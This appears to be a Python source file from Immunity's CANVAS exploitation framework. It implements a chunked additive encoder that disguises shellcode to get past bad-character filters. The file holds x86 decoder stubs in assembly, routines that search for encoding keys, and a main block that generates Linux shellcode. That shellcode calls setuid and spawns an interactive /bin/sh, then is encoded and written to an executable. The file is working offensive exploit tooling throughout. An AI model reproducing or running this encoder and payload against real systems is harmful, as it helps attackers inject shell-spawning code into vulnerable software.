#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information
"""
Immunity, Inc. 2002
ChunkedAddEncoder.py

This encoder creates a list of size,int tuples where each indicates a size and an encoding key
then there are blocks of data, each with a corresponding key in the key block
the key block is encoded last.

"""

import struct
import random
import sys

sys.path.append(".")

from exploitutils import *
from MOSDEF import mosdef

keys=[]
#stored keys
keys.append(0x6e9e159cL)
keys.append(0x3e8fba65L)
keys.append(0x8391a11fL)
keys.append(0xbafe1946L)
keys.append(0x09605bebL)
keys.append(0x04e907a4L)
keys.append(0x3c9f1b25L)
keys.append(0x0d3ee60eL)
keys.append(0x7aa4350dL)
keys.append(0x1991ce1fL)
keys.append(0x986eda0dL)
keys.append(0x3c9f1b25L)
keys.append(0x21ad3590L)
keys.append(0x6f9a0ac1L)
keys.append(0x1b67fd1bL)

#intel chunked add decoder (59 bytes)
#Potential bad characters:
#0x08, 0x0c, 0x04
#intelchunkeddecoder=binstring("0xeb 0x34 0x5b 0x8b 0x33 0x8b 0x7b 0x04 0x01 0xfe 0x8b 0x4b 0x08 0x01 0xf1 0x83 0xc3 0x0c 0x89 0xda 0x01 0x33 0x83 0xc3 0x04 0xe2 0xf9 0x53 0x8b 0x02 0x89 0xc1 0x85 0xc9 0x74 0x0f 0x8b 0x72 0x04 0x010x33 0x83 0xc3 0x04 0xe2 0xf9 0x83 0xc2 0x08 0xeb 0xe9 0x58 0xff 0xd0 0xe8 0xc7 0xff 0xff 0xff");
old_intelchunkeddecoder = """
decoder:
  jmp getcodestart
gotcodestart:
// avoiding '['
  popl %eax
  movl %eax,%ebx
  movl (%ebx),%esi
  movl 0x4(%ebx),%edi
  addl %edi,%esi
  movl 0x8(%ebx),%ecx
  addl %esi,%ecx
// avoiding 0x0c and 0x0b 0xa 0x09 equiv: add 0xc,%ebx
  xorl %eax,%eax
  movb $0x8,%al
  incl %eax
  incl %eax
  incl %eax
  incl %eax
  addl %eax,%ebx
  movl %ebx,%edx

label1:
  addl %esi,(%ebx)
  addl $0x4,%ebx
  loop label1
  pushl %ebx

label3:
  movl (%edx),%eax
  movl %eax,%ecx
  test %ecx,%ecx
  je decoded
  mov 0x4(%edx),%esi

label2:
  add %esi,(%ebx)
  add $0x4,%ebx
  loop label2
  add $0x8,%edx
  jmp label3

decoded:
  popl %eax
  call *%eax
// avoiding '>'and '=' and '@' badchar on jmp offset
  nop
  nop
  nop
  nop
getcodestart:
  call gotcodestart
"""
# New smaller one
# Free of '\x00','\x09','\r','\n','<','>','@','{','}','(',')','=',' ','.',',',';',':','/'
intelchunkeddecoder = """
decoder:
        jmp getcodestart
gotcodestart:
        popl %esi
        cld
        lodsl
.byte 0x93 //xchg %eax,%ebx
        lodsl
        leal (%eax,%ebx),%ebx
        lodsl
        leal (%eax,%ebx),%edx //we avoid a 0x0c by using edx here
        xchg %edx,%ecx //and move it into ecx here
        pushl %esi
        popl %edx
label1:
        addl %ebx,(%esi)
        lodsl
        loop label1
        push %esi
label3:
        movl (%edx),%eax //using %eax as tmp to avoid a badchar
.byte 0x91 //xchg %eax,%ecx
        test %ecx,%ecx
        je decoded
        mov 0x4(%edx),%ebx
label2:
        add %ebx,(%esi)
        lodsl
        loop label2
        add $0x8,%edx
        jmp label3
        nop //to avoid a badchar
decoded:
        popl %eax
        call *%eax
        nop
        nop
getcodestart:
        call gotcodestart
"""

#set the seed to something static for debugging
import os  
random.seed(os.getpid())

class intelchunkedaddencoder:
    def __init__(self):
        self.minimumchunklength=140
        self.setadd=uint32(0)
        return

    def run(self,filename):
        return self.encode(open(filename,"r").read())

    def getKey(self):
        return self.setadd

    def setbadstring(self,badstring):
        self.badstring=badstring
        return

    def has_bad_char(self,astring):
        i=self.find_bad_char(astring)
        if i==-1:
            return 0
        return 1

    def find_bad_char(self,astring):
        """
        we have to do it the slow way, sorry
        """
        
        i=0
        while i<len(astring):
            index=self.badstring.find(astring[i])
            if index!=-1:
                #print "Failed on %x at %d"%(ord(ch),index)
                return i
            i+=1
        return -1

    def xordata(self,data,xor,debug=0):
        i=0
        newdata=""
        while i<len(data):
            word=struct.unpack("<L", data[i:i+4])
            word=uint32(word[0])
            word2=uint32(word^xor)
            
            #devlog("encoder", "%8.8x->%8.8x"%(word, word2))
            newdata += struct.pack("<L", word2)
            i+=4
        return newdata
        
    def encodedata(self,data,debug=0):
        i=0
        newdata=""
        #print "Len data="+str(len(data))
        while i<len(data):
            #print "i=%d"%i 
            word=struct.unpack("<L", (data[i:i+4]))
            word=uint32(word[0])
            word2=csub(word,self.setadd)

            #devlog("encoder",  "%8.8x->%8.8x"%(word,word2))
            newdata+=struct.pack("<L", word2)
            i+=4
        #print "Len newdata="+str(len(newdata))
        return newdata
            
    def encode(self,data):
        mod=4-len(data)%4
        if mod!=4:
            data=data+"\x00"*mod

        (split1,split2,newdata)=self.findadditives(data)
        if split1==None:
            devlog("encoder",  "Error: Did not find split for your shellcode!")
            return ""
        
        split1=struct.pack("<L", split1)
        split2=struct.pack("<L", split2)
        #print "Assembling decoder stub"
        decoderstub = ""
        line = 0
        decoderlist=[old_intelchunkeddecoder,intelchunkeddecoder]
        
        decoder=intelchunkeddecoder
        if ";" in self.badstring:
            decoder=decoder.replace("movl (%ebx),%edi","movl %ebx, %edi\nmovl (%edi), %edi")
        if "?" in self.badstring:
            decoder=decoder.replace("movl (%edi), %edi","dec %edi\nmovl 1(%edi), %edi")            
        decoderlist+=[decoder]
        decoderstubList=[]
        #now create a list of our decoder stubs
        #each will fit past various filters
        for decoder in decoderlist:
            decoderstub = mosdef.assemble(decoder, "X86")
            if not decoderstub:
                print "Could not assemble decoder stub!: %s"%decoder 
            decoderstubList+=[decoderstub]
            
        if 0:
            #debug stuff
            for c in decoderstub:
                sys.stdout.write("\\x%02x"%ord(c))
                line += 1
                if line == 8:
                    line = 0
                    sys.stdout.write("\n")
            sys.stdout.write("\n")
            
        devlog("encoder", "Testing for decoder viability")
        failed=True 
        for decoderstub in decoderstubList:
            #smart check for bad characters in the decoder stub!
            for c in self.badstring:
                if c in decoderstub:
                    devlog("encoder","Bad char: 0x%02x == %c"%(ord(c),c))
                    offset=decoderstub.find(c)
                    devlog("encoder","Offset: %d"%offset)
                    #this will print out a metadata output for the offending
                    #line...reasonably easy to figure out from here...
                    stub,meta=mosdef.assembleEx(intelchunkeddecoder,"X86")
                    if meta:
                        for m in meta:
                            if m["offset"]>offset:
                                devlog("encoder", "Offending line: %s"%x)
                                break
                            x=m
            failed=False 
            
        if failed:    
            raise Exception, "bad character in decoder stub!"

        devlog("encoder", "Found a good decoder for chunkedaddencoder!")
        result=decoderstub+split1+split2+newdata
        return result


    def encodechunk(self,data, cancutblock=True):
        """
        returns the size and the integer we encoded with
        """
        i=uint32(0)
        j=uint32(0)
        #we'll look for 50000 words
        self.presets=keys[:]
        while j<500000:
            j+=1
            if len(self.presets)>0:
                guess=self.presets.pop()
            else:
                guess=random.randint(0,0x7fffffff-1)

                
            if random.randint(0,2)==1:
                guess=uint32(-guess)
            failed=0
            self.setadd=guess
            #print "%d - Trying Guess: %8.8x"%(j,guess)
            newdata=self.encodedata(data)
            bad=self.find_bad_char(newdata)
            if bad==-1:
                #in words...
                newdatalen=len(newdata)/4
                #encoded entire buffer as this chunk!
                return (newdatalen,guess,newdata)
            
            if not cancutblock:
                #we can't cut this block down to size (as it is a header block)
                #so we continue to look for a new key
                #you can get very big header blocks sometimes, which means 
                #they will conceivably be > self.minimumchunklength
                continue
            
            if bad!=-1 and bad < self.minimumchunklength:
                failed=1
                if failed:
                    continue
            #newdata=self.encodedata(data,debug=1)

            #if we get here, we didn't encode the whole chunk, but we got enough of it to continue
            #we do this in words, rounded down
            newdatalen=(bad-bad%4)
            newdata=newdata[:newdatalen]
            #convert to words
            newdatalen=newdatalen/4
            return (newdatalen,guess,newdata)
                
        return (None,None,None)
    
    def findadditives(self,data):
        """
        finds the first two keys
        we use to encode the header block with
        """
        #print "len(data)=%d"%len(data)
        chunktuples=[]
        newdata=data
        newblocks=""
        while newdata!="":
            (size,key,encodedblock)=self.encodechunk(newdata)
            if key==None:
                devlog("encoder", "FAILED TO ENCODE A CHUNK!")
                return (None,None,None)
            chunktuples.append((size,key))
            devlog("encoder",  "new blocks size is %d"%size)
            newdata=newdata[size*4:]
            newblocks+=encodedblock
        #each tuple is 8 bytes long plus 4 for the final zero word
        headerblocksize=len(chunktuples)*8+4
        #in words
        headerblocksize=headerblocksize/4 
        #we start the header block off with the size of the rest of the block
        headerblock=struct.pack("<L", headerblocksize)
        for tuple in chunktuples:
            devlog("encoder",  "Size of chunk is %d key is 0x%8.8x"%(tuple[0],uint32(tuple[1])))
            headerblock+=struct.pack("<L", tuple[0])+struct.pack("<L", tuple[1])

        #a zero size indicates the end
        headerblock+=struct.pack("<L", 0)
        
        #then we encode the whole thing
        #you cannot cut these blocks down
        (size,key,block)=self.encodechunk(headerblock, cancutblock=False )
        if key==None:
            devlog("encoder",  "Could not encode header block!")
            return (None,None,None)
        alldata=block+newblocks
        (key1,key2)=self.splitadditives(key)
        devlog("encoder", "Split key %x into %x and %x"%(key, key1, key2))
        return (key1,key2,alldata)
        
        
    def splitadditives(self,guess):
        j=uint32(0)
        failed=0
        #we'll look for 50000 words
        devlog("encoder", "Encoder is Splitting: %8.8x"%uint32(guess))
        
        while j<150000:
            j+=1
            guess2=random.randint(0,0x7fffffff-1)
            if random.randint(0,2)==1:
                guess2=uint32(-guess2)

            result=csub(guess,guess2)
            #print "J=%d"%j
            #print "Result="+str(result)+":%8.8x"%result
            #print "Quess2="+str(guess2)+":%8.8x"%guess2
            
            if self.has_bad_char(struct.pack("<L", result)+struct.pack("<L", guess2)):
                failed=1
                #print "Failed"
                continue
            else:
                failed=0
                #print "Found one!"
                break

        if failed:
            devlog("encoder",  "Failed to split guess: 0x%8.8x"%(uint32(guess)))
            return (None, None)
        else:
            devlog("encoder",  "Split %x into %x:%x"%(uint32(guess),uint32(result),uint32(guess2)))
            return (result,guess2)        
                
            
            
        
def usage():
    print """
    Add Encoder 1.0, Immunity, Inc.
    usage: addencoder.py -f shellcode
    """
    sys.exit(2)

    
#this stuff happens.
if __name__ == '__main__':

    print "Running Chunked Additive Encoder v 1.0"

    app=intelchunkedaddencoder()
    sys.path.append("./shellcode")
    import shellcodeGenerator
    myshellcode=shellcodeGenerator.linux_X86()
    #myshellcode.addAttr("Normalize Stack",[0])
    #myshellcode.addAttr("dup2",None)
    myshellcode.addAttr("setuid",None)
    #myshellcode.addAttr("debugme",None)
    myshellcode.addAttr("execve",{"argv": ["/bin/sh","-i"],"envp": [],"filename": "/bin/sh"})
    sc=myshellcode.get()

    
    app.setbadstring("\x00\r\n\x20&")
    data=app.encode(sc)
    print "Shellcode=%s"%hexprint(data)
    import makeexe
    makeexe.makelinuxexe(data,filename="a.out")
    print "Wrote a.out"
